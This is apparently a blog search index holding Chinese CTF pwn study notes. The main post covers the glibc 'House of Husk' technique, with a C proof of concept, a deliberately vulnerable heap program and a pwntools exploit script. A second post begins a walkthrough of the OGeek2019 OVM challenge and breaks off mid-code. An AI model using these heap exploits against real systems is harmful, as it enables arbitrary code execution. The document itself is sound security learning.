<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>house_of_husk</title>
      <link href="/posts/54266.html"/>
      <url>/posts/54266.html</url>
      
        <content type="html"><![CDATA[<p>本文的学习自：</p><p><a href="https://www.getspwn.xyz/?p=81">House of Husk源码例题 - blog at gets</a></p><p><a href="https://zikh26.github.io/posts/6c83c2a2.html">关于house of husk的学习总结 | ZIKH26’s Blog</a></p><h1 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h1><p><code>printf</code> 函数通过检查 <code>__printf_function_table</code> 是否为空，来判断是否有自定义的格式化字符，如果判定为有的话，则会去执行 <code>__printf_arginfo_table[spec]</code> 处的函数指针</p><p>我们改写<code>__printf_function_table</code>里面的值不为空，再改写<code>__printf_arginfo_table[spec]</code>处的值为one_gadgets</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><code>poc</code> 源自 <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507">https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a Proof-of-Concept for House of Husk</span></span><br><span class="line"><span class="comment"> * This PoC is supposed to be run with libc-2.27.</span></span><br><span class="line"><span class="comment"> gcc poc.c -o poc -no-pie -g</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3ebc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3f0738</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3ec870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0x10a2fc</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> libc_base;</span><br><span class="line">  <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>); <span class="comment">// make printf quiet</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* leak libc */</span></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* UAF chunk */</span></span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* avoid consolidation */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* prepare fake printf arginfo table */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line">    <span class="comment">//now __printf_arginfo_table[&#x27;X&#x27;] = one_gadget;</span></span><br><span class="line">    <span class="comment">//*(unsigned long*)(a[1] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET;</span></span><br><span class="line">  <span class="comment">/* unsorted bin attack */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* overwrite global_max_fast */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* overwrite __printf_arginfo_table and __printf_function_table */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);<span class="comment">// __printf_function_table =&gt; a heap_addr which is not NULL</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);<span class="comment">// =&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ignite! */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意要再ubuntu18.04的版本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br></pre></td></tr></table></figure><ul><li>将目标偏移（如 <code>PRINTF_FUNCTABLE - MAIN_ARENA</code>）转换为堆块大小。</li></ul><blockquote><p>通过分配特定大小的堆块，使得：</p><ul><li><code>a[1]</code> 的地址 &#x3D; <code>libc_base + PRINTF_FUNCTABLE</code></li><li><code>a[2]</code> 的地址 &#x3D; <code>libc_base + PRINTF_ARGINFO</code></li></ul><p>这样当释放 <code>a[1]</code> 和 <code>a[2]</code> 到 fastbin 时，它们的地址会被写入 <code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code>。</p><h4 id="2-实现方法"><a href="#2-实现方法" class="headerlink" title="2. 实现方法"></a>2. <strong>实现方法</strong></h4><ul><li>利用 <code>offset2size</code> 宏将目标偏移转换为堆块大小。</li><li>堆管理器根据请求的大小分配内存，使堆块地址与目标全局变量地址对齐。</li></ul></blockquote><p>这里解释一下，因为后面我们会改写GLOBAL_MAX_FAST使得所有的堆快的被释放是都会进入fastbin指针，原来只有0x80的大小肯定是不够的，我们通过offset2size计算溢出就可以达到指定位置写入对应的值</p><ul><li>公式：<code>size = (目标偏移) * 2 - 0x10</code><br>例如，若 <code>PRINTF_FUNCTABLE - MAIN_ARENA = 0x3f0738 - 0x3ebc40 = 0x4af8</code>，则 <code>size = 0x4af8 * 2 - 0x10 = 0x95f0</code>。</li><li><strong>目的</strong>：使得 <code>a[1]</code> 和 <code>a[2]</code> 的地址正好对应 <code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code>。</li><li>简单来说就是使得a[idx]的地址正好对应的就是<code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code></li></ul><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202503252239443.png" alt="image-20250325223911280"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202503252239788.png" alt="image-20250325223959747"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* overwrite global_max_fast */</span></span><br></pre></td></tr></table></figure><p>改写fastbin放入的地址可以很大，这是这一整个实验的基本条件实现</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>题目和脚本来自<a href="https://www.getspwn.xyz/?p=81">House of Husk源码例题 - blog at gets</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *chunk_list[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. add chunk&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. delete chunk&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. edit chunk&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. show chunk&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;choice:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">get_num</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add_chunk</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index = get_num();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> size = get_num();</span><br><span class="line">    chunk_list[index] = <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_chunk</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index = get_num();</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">edit_chunk</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index = get_num();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;length:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> length = get_num();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, chunk_list[index], length);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show_chunk</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index = get_num();</span><br><span class="line">    <span class="built_in">puts</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="type">int</span> choice = get_num();</span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                add_chunk();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                delete_chunk();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                edit_chunk();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                show_chunk();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;invalid choice %d.\n&quot;</span>, choice);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是通过unsortbin attack改GLOBAL_MAX_FAST</p><p>接着按照上面的手法改写 <code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code>，实现执行one_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./demo2&quot;</span>)</span><br><span class="line">elf= ELF(<span class="string">&#x27;./demo2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line">    io.sendafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;length:&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">ogg=[<span class="number">0xebc81</span>,<span class="number">0xebc85</span>,<span class="number">0xebc88</span>,<span class="number">0xebce2</span>,<span class="number">0xebd38</span>,<span class="number">0xebd3f</span>,<span class="number">0xebd43</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">4</span>, (<span class="number">0x7ffff7e1b8b0</span> - (<span class="number">0x7ffff7e1ac80</span>+ <span class="number">0x10</span>)) * <span class="number">2</span> + <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">6</span>, (<span class="number">0x7ffff7e1c9c8</span> - (<span class="number">0x7ffff7e1ac80</span>+ <span class="number">0x10</span>)) * <span class="number">2</span> + <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recv()</span><br><span class="line">libc.address = u64((io.recv(<span class="number">6</span>)).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x21ace0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x500</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(libc.address+<span class="number">0x221500</span> - <span class="number">0x20</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x500</span>)</span><br><span class="line">one_gadget =ogg[<span class="number">6</span>] + libc.address</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;one_gadget&#x27;</span>,one_gadget)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, (<span class="built_in">ord</span>(<span class="string">&#x27;d&#x27;</span>) * <span class="number">8</span> - <span class="number">0x10</span>) * <span class="string">b&#x27;\x00&#x27;</span> + p64(one_gadget))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>执行了execute函数,但是参数不对，由于本题的学习的思路及目的已经完成，就没接着去想着怎么改好参数了（其实是调试失败，遂放弃）</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202503282243151.png" alt="image-20250328224351057"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> io heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMpwn入门学习</title>
      <link href="/posts/43250.html"/>
      <url>/posts/43250.html</url>
      
        <content type="html"><![CDATA[<p>这里将以一道入门级别的vmpwn题目简单学习一下</p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>题目会模拟指令，根据题目意思解题即可，而且这类的题目往往存在数组溢出的问题</p><h1 id="例题1：-OGeek2019-Final-OVM"><a href="#例题1：-OGeek2019-Final-OVM" class="headerlink" title="例题1：[OGeek2019 Final]OVM"></a>例题1：[OGeek2019 Final]OVM</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int16 size; <span class="comment">// [rsp+2h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 pc; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v6; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  heap = <span class="built_in">malloc</span>(<span class="number">0x8C</span>uLL);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  signal(<span class="number">2</span>, signal_handler);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WELCOME TO OVM PWN\n&quot;</span>, <span class="number">0x16</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;PC: &quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;pc）;                          <span class="comment">//填0,后面方便填入数据</span></span><br><span class="line">  getchar();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;SP: &quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;v6);                     </span><br><span class="line">  getchar();</span><br><span class="line">  reg[<span class="number">13</span>] = v6;</span><br><span class="line">  reg[<span class="number">15</span>] = pc;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;CODE SIZE: &quot;</span>, <span class="number">0xB</span>uLL);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;size);                      <span class="comment">//操作执行的次数</span></span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v6 + (<span class="type">unsigned</span> <span class="type">int</span>)size &gt; <span class="number">0x10000</span> || !size )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;EXCEPTION\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">155</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;CODE: &quot;</span>, <span class="number">6uLL</span>);</span><br><span class="line">  running = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; size &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;memory[pc + i]);</span><br><span class="line">    <span class="keyword">if</span> ( (memory[i + pc] &amp; <span class="number">0xFF000000</span>) == <span class="number">0xFF000000</span> )</span><br><span class="line">      memory[i + pc] = <span class="number">0xE0000000</span>;</span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( running )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = fetch();</span><br><span class="line">    execute(v7);</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>, <span class="number">0x1B</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, heap, <span class="number">0x8C</span>uLL);</span><br><span class="line">  sendcomment(heap);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Bye\n&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面的操作数，pc sp在这题中没有什么作用，size决定后面的输入的循环的次数</p><h3 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h3><p>现在我们来逆向这题的重点，execute函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 